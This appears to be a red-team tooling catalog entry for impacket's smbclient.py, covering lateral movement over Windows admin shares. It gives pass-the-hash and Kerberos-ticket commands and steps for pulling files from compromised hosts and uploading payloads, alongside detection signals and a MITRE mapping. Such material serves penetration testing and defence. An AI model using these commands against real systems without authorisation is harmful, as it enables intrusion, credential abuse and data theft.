---
name: impacket-smbclient
category: lateral-movement
subcategories: [smb-file-access, lateral-movement, file-transfer]
tradecraft_tags: [smb, file-access, lateral-movement, impacket, python, linux-side]
mitre_attack:
  - id: T1021.002
    name: Remote Services — SMB/Windows Admin Shares
source:
  url: https://github.com/fortra/impacket
  license: Apache-2.0
  maintained: true
binary_type: python-script
binary_filename: smbclient.py
supported_os: [linux]
architecture: [x64]
privilege_required: local-admin
network_required: true
detection_signal: |
  SMB authentication events (Event 4624 type 3) on the target. Share access generates
  file access events if file object auditing is configured. C$ and ADMIN$ access from
  non-standard source IPs is anomalous.
usage_examples:
  - description: Interactive SMB shell for file browsing
    args: "smbclient.py DOMAIN/administrator:Password123@TARGET_IP"
  - description: Pass-the-hash SMB access
    args: "smbclient.py -hashes :nthash DOMAIN/administrator@TARGET_IP"
  - description: Kerberos ticket SMB access
    args: "KRB5CCNAME=admin.ccache smbclient.py -k -no-pass DOMAIN/administrator@TARGET_IP"
  - description: Single command via SMB
    args: "smbclient.py DOMAIN/admin:pass@TARGET_IP -c 'use C$; ls'"
opsec_notes: |
  Python-only — infrastructure side. Provides interactive SMB access (file browse,
  upload, download) from Linux. Useful for retrieving files from compromised hosts
  or staging files for execution. SMB access to C$ and ADMIN$ generates authentication
  events and is detectable as lateral movement.
gotchas: |
  Python-only. Kerberos mode requires KRB5CCNAME to be set to a valid ccache file.
  Interactive mode requires knowing the share structure. Use Apollo's download/upload
  commands for in-agent file operations; use smbclient.py from Linux infrastructure
  when direct SMB access is needed.
related_ttps: [crackmapexec, impacket-wmiexec, impacket-smbserver, pass-the-hash]
alternatives: [crackmapexec-smb, smbmap, impacket-smbserver]
common_args:
  target:
    description: Target in DOMAIN/user:pass@IP format
    typical_values: ["DOMAIN/administrator:Password123@192.168.56.22"]
    required: true
  -hashes:
    description: NTLM hashes (LM:NT) for pass-the-hash
    typical_values: [":nthash"]
  -k:
    description: Kerberos authentication (use with KRB5CCNAME env var)
    typical_values: [flag-only]
  -c:
    description: SMB command to execute (non-interactive)
    typical_values: ["'use C$; ls'", "'get secret.txt'"]
last_updated: 2026-05-29
---

# impacket-smbclient

impacket's SMB interactive client. Provides file browser-like access to SMB shares
on Windows targets from Linux infrastructure. Supports password, hash, and Kerberos
ticket authentication.

## Typical use cases
- Browse and retrieve files from compromised hosts via SMB
- Upload staged tools to target via ADMIN$ or C$ share
- Pass-the-hash file access when no shell exists on the target
- Verify SMB access before setting up more complex lateral movement

## Common File Operations

```python
# In interactive mode:
use C$                   # Connect to C$ share
ls Users\Administrator\  # List directory
get secret.txt           # Download file
put payload.exe Windows\Temp\  # Upload file
```

## Apollo-specific note
Python/Linux only. For in-agent file operations, Apollo's download and upload
commands are preferred.
